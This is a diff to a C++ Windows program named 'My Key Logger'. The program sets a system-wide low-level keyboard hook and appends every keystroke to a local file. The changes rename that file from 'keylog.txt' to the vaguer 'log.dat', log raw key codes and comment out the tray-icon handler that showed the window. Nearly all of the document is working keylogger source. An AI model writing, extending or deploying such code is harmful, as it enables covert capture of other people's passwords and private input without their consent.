@@ -6,144 +6,128 @@ using namespace std;
 
 // Global variables
 std::ofstream logFile;
-HHOOK keyboardHook = NULL;
+HHOOK keyboardHook = nullptr;
 NOTIFYICONDATA notifyIconData;
 
 auto getVKCodeValue(DWORD vkCode) {
-    map <DWORD, string> vkcodes;
-    vkcodes[1] = "Left mouse button";
-    vkcodes[2] = "Right mouse button";
-    vkcodes[3] = "Control-break processing";
-    vkcodes[4] = "Middle mouse button (three-button mouse)";
-    vkcodes[5] = "WIN 2000: X1 mouse button";
-    vkcodes[6] = "WIN 2000: X2 mouse button";
-    vkcodes[7] = "Undefined";
-    vkcodes[8] = "BckS";
-    vkcodes[9] = "TAB";
-    vkcodes[12] = "CLEAR";
-    vkcodes[13] = "ENTER";
-    vkcodes[16] = "SHIFT";
-    vkcodes[17] = "CTRL";
-    vkcodes[18] = "ALT";
-    vkcodes[19] = "PAUSE";
-    vkcodes[20] = "CAPS LOCK";
-    vkcodes[21] = "IME Kana mode";
-    vkcodes[22] = "IME Hanguel mode";
-    vkcodes[23] = "IME Hangul mode";
-    vkcodes[24] = "IME Junja mode";
-    vkcodes[25] = "IME final mode";
-    vkcodes[26] = "IME Hanja mode";
-    vkcodes[27] = "ESC";
-    vkcodes[28] = "IME convert";
-    vkcodes[29] = "IME nonconvert";
-    vkcodes[30] = "IME accept";
-    vkcodes[31] = "IME mode change request";
-    vkcodes[32] = " ";
-    vkcodes[33] = "PUP";
-    vkcodes[34] = "PDOWN";
-    vkcodes[35] = "END";
-    vkcodes[36] = "HOME";
-    vkcodes[37] = "LARR";
-    vkcodes[38] = "UARR";
-    vkcodes[39] = "RARR";
-    vkcodes[40] = "DARR";
-    vkcodes[41] = "SELECT";
-    vkcodes[42] = "PRINT";
-    vkcodes[43] = "EXECUTE";
-    vkcodes[44] = "PRTSC";
-    vkcodes[45] = "INS";
-    vkcodes[46] = "DEL";
-    vkcodes[47] = "HELP";
-    vkcodes[48] = "0";
-    vkcodes[49] = "1";
-    vkcodes[50] = "2";
-    vkcodes[51] = "3";
-    vkcodes[52] = "4";
-    vkcodes[53] = "5";
-    vkcodes[54] = "6";
-    vkcodes[55] = "7";
-    vkcodes[56] = "8";
-    vkcodes[57] = "9";
-    vkcodes[65] = "A";
-    vkcodes[66] = "B";
-    vkcodes[67] = "C";
-    vkcodes[68] = "D";
-    vkcodes[69] = "E";
-    vkcodes[70] = "F";
-    vkcodes[71] = "G";
-    vkcodes[72] = "H";
-    vkcodes[73] = "I";
-    vkcodes[74] = "J";
-    vkcodes[75] = "K";
-    vkcodes[76] = "L";
-    vkcodes[77] = "M";
-    vkcodes[78] = "N";
-    vkcodes[79] = "O";
-    vkcodes[80] = "P";
-    vkcodes[81] = "Q";
-    vkcodes[82] = "R";
-    vkcodes[83] = "S";
-    vkcodes[84] = "T";
-    vkcodes[85] = "U";
-    vkcodes[86] = "V";
-    vkcodes[87] = "W";
-    vkcodes[88] = "X";
-    vkcodes[89] = "Y";
-    vkcodes[90] = "Z";
-    vkcodes[91] = "LWIN";
-    vkcodes[92] = "RWIN";
-    vkcodes[93] = "APP";
-    vkcodes[94] = "Reserved";
-    vkcodes[95] = "Computer Sleep";
-    vkcodes[96] = "NUMPAD0";
-    vkcodes[97] = "NUMPAD1";
-    vkcodes[98] = "NUMPAD2";
-    vkcodes[99] = "NUMPAD3";
-    vkcodes[100] = "NUMPAD4";
-    vkcodes[101] = "NUMPAD5";
-    vkcodes[102] = "NUMPAD6";
-    vkcodes[103] = "NUMPAD7";
-    vkcodes[104] = "NUMPAD8";
-    vkcodes[105] = "NUMPAD9";
-    vkcodes[106] = "Multiply";
-    vkcodes[107] = "Add";
-    vkcodes[108] = "Separator";
-    vkcodes[109] = "Subtract";
-    vkcodes[110] = "Decimal";
-    vkcodes[111] = "Divide";
-    vkcodes[112] = "F1";
-    vkcodes[113] = "F2";
-    vkcodes[114] = "F3";
-    vkcodes[115] = "F4";
-    vkcodes[116] = "F5";
-    vkcodes[117] = "F6";
-    vkcodes[118] = "F7";
-    vkcodes[119] = "F8";
-    vkcodes[120] = "F9";
-    vkcodes[121] = "F10";
-    vkcodes[122] = "F11";
-    vkcodes[123] = "F12";
-    vkcodes[124] = "F13";
-    vkcodes[125] = "F14";
-    vkcodes[126] = "F15";
-    vkcodes[127] = "F16";
-    vkcodes[144] = "NUMLOCK";
-    vkcodes[160] = "LSHIFT";
-    vkcodes[161] = "RSHIFT";
-    vkcodes[162] = "LCNTRL";
-    vkcodes[163] = "RCNTRL";
-
-    return vkcodes.find(vkCode);
+    map <DWORD, string> codeMap;
+    codeMap[8] = "BCKSPC";
+    codeMap[9] = "TAB";
+    codeMap[12] = "CLEAR";
+    codeMap[13] = "ENTER";
+    codeMap[16] = "SHIFT";
+    codeMap[17] = "CTRL";
+    codeMap[18] = "ALT";
+    codeMap[19] = "PAUSE";
+    codeMap[20] = "CAPS LOCK";
+    codeMap[27] = "ESC";
+    codeMap[32] = " ";
+    codeMap[33] = "PgUP";
+    codeMap[34] = "PgDN";
+    codeMap[35] = "END";
+    codeMap[36] = "HOME";
+    codeMap[37] = "←";
+    codeMap[38] = "↑";
+    codeMap[39] = "→";
+    codeMap[40] = "↓";
+    codeMap[41] = "SELECT";
+    codeMap[42] = "PRINT";
+    codeMap[43] = "EXECUTE";
+    codeMap[44] = "PRTSC";
+    codeMap[45] = "INS";
+    codeMap[46] = "DEL";
+    codeMap[47] = "HELP";
+    codeMap[48] = "0";
+    codeMap[49] = "1";
+    codeMap[50] = "2";
+    codeMap[51] = "3";
+    codeMap[52] = "4";
+    codeMap[53] = "5";
+    codeMap[54] = "6";
+    codeMap[55] = "7";
+    codeMap[56] = "8";
+    codeMap[57] = "9";
+    codeMap[65] = "A";
+    codeMap[66] = "B";
+    codeMap[67] = "C";
+    codeMap[68] = "D";
+    codeMap[69] = "E";
+    codeMap[70] = "F";
+    codeMap[71] = "G";
+    codeMap[72] = "H";
+    codeMap[73] = "I";
+    codeMap[74] = "J";
+    codeMap[75] = "K";
+    codeMap[76] = "L";
+    codeMap[77] = "M";
+    codeMap[78] = "N";
+    codeMap[79] = "O";
+    codeMap[80] = "P";
+    codeMap[81] = "Q";
+    codeMap[82] = "R";
+    codeMap[83] = "S";
+    codeMap[84] = "T";
+    codeMap[85] = "U";
+    codeMap[86] = "V";
+    codeMap[87] = "W";
+    codeMap[88] = "X";
+    codeMap[89] = "Y";
+    codeMap[90] = "Z";
+    codeMap[91] = "LWIN";
+    codeMap[92] = "RWIN";
+    codeMap[93] = "APP";
+    codeMap[95] = "SLP";
+    codeMap[96] = "NUMPAD0";
+    codeMap[97] = "NUMPAD1";
+    codeMap[98] = "NUMPAD2";
+    codeMap[99] = "NUMPAD3";
+    codeMap[100] = "NUMPAD4";
+    codeMap[101] = "NUMPAD5";
+    codeMap[102] = "NUMPAD6";
+    codeMap[103] = "NUMPAD7";
+    codeMap[104] = "NUMPAD8";
+    codeMap[105] = "NUMPAD9";
+    codeMap[106] = "MUL";
+    codeMap[107] = "ADD";
+    codeMap[108] = "SEP";
+    codeMap[109] = "SUB";
+    codeMap[110] = "DEC";
+    codeMap[111] = "DIV";
+    codeMap[112] = "F1";
+    codeMap[113] = "F2";
+    codeMap[114] = "F3";
+    codeMap[115] = "F4";
+    codeMap[116] = "F5";
+    codeMap[117] = "F6";
+    codeMap[118] = "F7";
+    codeMap[119] = "F8";
+    codeMap[120] = "F9";
+    codeMap[121] = "F10";
+    codeMap[122] = "F11";
+    codeMap[123] = "F12";
+    codeMap[124] = "F13";
+    codeMap[125] = "F14";
+    codeMap[126] = "F15";
+    codeMap[127] = "F16";
+    codeMap[144] = "NUMLOCK";
+    codeMap[160] = "LSHIFT";
+    codeMap[161] = "RSHIFT";
+    codeMap[162] = "LCNTRL";
+    codeMap[163] = "RCNTRL";
+    return codeMap.find(vkCode);
 }
 
 // Function to handle key press and write to log file
 void HandleKeyPress(DWORD vkCode)
 {
     // Open the log file in append mode
-    logFile.open("keylog.txt", ios_base::app);
+    logFile.open("log.dat", ios_base::app);
 
     // Write the key code to the log file
-    logFile << getVKCodeValue(vkCode)->second;
+    if (vkCode == 8) {
+
+    }
+    logFile << vkCode << " ";
 
     // Close the log file
     logFile.close();
@@ -155,9 +139,8 @@ LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
     if (nCode >= 0)
     {
         // Extract key information from the event
-        KBDLLHOOKSTRUCT* pKeyboardStruct = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
+        auto* pKeyboardStruct = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
         DWORD vkCode = pKeyboardStruct->vkCode;
-        DWORD flags = pKeyboardStruct->flags;
 
         // Check if a key is being pressed (key down event)
         if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
@@ -168,7 +151,7 @@ LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
     }
 
     // Pass the event to the next hook procedure
-    return CallNextHookEx(NULL, nCode, wParam, lParam);
+    return CallNextHookEx(nullptr, nCode, wParam, lParam);
 }
 
 // Window procedure
@@ -179,8 +162,8 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
         case WM_CREATE:
         {
             // Set up the keyboard hook
-            keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHookProc, GetModuleHandle(NULL), 0);
-            if (keyboardHook == NULL)
+            keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHookProc, GetModuleHandle(nullptr), 0);
+            if (keyboardHook == nullptr)
             {
                 MessageBox(hwnd, "Failed to set up keyboard hook.", "Error", MB_OK | MB_ICONERROR);
                 DestroyWindow(hwnd);
@@ -194,7 +177,7 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
             notifyIconData.uID = 1;
             notifyIconData.uFlags = NIF_ICON | NIF_MESSAGE | NIF_TIP;
             notifyIconData.uCallbackMessage = WM_USER + 1;
-            notifyIconData.hIcon = LoadIcon(NULL, IDI_APPLICATION);
+            notifyIconData.hIcon = LoadIcon(nullptr, IDI_APPLICATION);
             lstrcpy(notifyIconData.szTip, "My Key Logger");
             Shell_NotifyIcon(NIM_ADD, &notifyIconData);
 
@@ -205,10 +188,10 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
 
         case WM_CLOSE:
             // Unhook the keyboard hook
-            if (keyboardHook != NULL)
+            if (keyboardHook != nullptr)
             {
                 UnhookWindowsHookEx(keyboardHook);
-                keyboardHook = NULL;
+                keyboardHook = nullptr;
             }
 
             // Remove the system tray icon
@@ -223,13 +206,13 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
 
         case WM_USER + 1:
             // Handle system tray icon messages
-            switch (lParam)
-            {
-                case WM_LBUTTONDOWN:
-                    // Show or hide the window when the left mouse button is clicked on the system tray icon
-                    ShowWindow(hwnd, IsWindowVisible(hwnd) ? SW_HIDE : SW_SHOW);
-                    break;
-            }
+//            switch (lParam)
+//            {
+//                case WM_LBUTTONDOWN:
+//                    // Show or hide the window when the left mouse button is clicked on the system tray icon
+//                    ShowWindow(hwnd, IsWindowVisible(hwnd) ? SW_HIDE : SW_SHOW);
+//                    break;
+//            }
 
             break;
 
@@ -253,7 +236,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
     if (!RegisterClass(&wc))
     {
-        MessageBox(NULL, "Failed to register window class.", "Error", MB_OK | MB_ICONERROR);
+        MessageBox(nullptr, "Failed to register window class.", "Error", MB_OK | MB_ICONERROR);
         return -1;
     }
 
@@ -264,23 +247,23 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
             "My Key Logger",
             WS_OVERLAPPEDWINDOW,
             CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,
-            NULL,
-            NULL,
+            nullptr,
+            nullptr,
             hInstance,
-            NULL
+            nullptr
     );
 
-    if (hwnd == NULL)
+    if (hwnd == nullptr)
     {
-        MessageBox(NULL, "Failed to create window.", "Error", MB_OK | MB_ICONERROR);
+        MessageBox(nullptr, "Failed to create window.", "Error", MB_OK | MB_ICONERROR);
         return -1;
     }
 
     // Message loop
     MSG msg;
-    while (GetMessage(&msg, NULL, 0, 0))
+    while (GetMessage(&msg, nullptr, 0, 0))
     {
-        if (!TranslateAccelerator(hwnd, NULL, &msg))
+        if (!TranslateAccelerator(hwnd, nullptr, &msg))
         {
             TranslateMessage(&msg);
             DispatchMessage(&msg);
@@ -288,10 +271,10 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     }
 
     // Cleanup
-    if (keyboardHook != NULL)
+    if (keyboardHook != nullptr)
     {
         UnhookWindowsHookEx(keyboardHook);
-        keyboardHook = NULL;
+        keyboardHook = nullptr;
     }
 
     return 0;
